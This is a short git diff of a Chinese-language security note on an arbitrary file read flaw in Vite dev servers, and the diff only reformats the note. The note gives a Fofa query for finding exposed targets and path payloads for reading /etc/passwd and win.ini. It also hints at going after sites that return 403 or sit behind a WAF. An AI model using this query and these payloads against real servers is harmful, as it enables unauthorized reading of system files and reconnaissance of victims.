@@ -4,17 +4,15 @@
 通过url去拼接下面路径来任意文件读取
 
 Fofa测绘语句:
-```
-body="/@vite/client"
-```
 
-```
+body="/@vite/client"
+
+
 /etc/passwd?raw"  # Linux系统文件
 
 "/Windows/win.ini?raw" #windows文件
-```
 
-poc就是这么简单，市面上能检索到的也挺多，不过这里添加进来也是有个思路所以记录一下
+## poc就是这么简单，市面上能检索到的也挺多，不过这里添加进来也是有个思路所以记录一下
 
 搜集完后去扫基本已经没剩几个了，很多都重复，不过有个其他的思路。讲一个小技巧，现在基本上常规的直接拼接路径已经刷烂了，不过我们可以把注意力放到一些403和有waf的网站
 ![a3bb815b6baee72ad140b6c829163a8](https://github.com/user-attachments/assets/bfd9424e-933d-43a1-bc16-c2f1038b47f2)
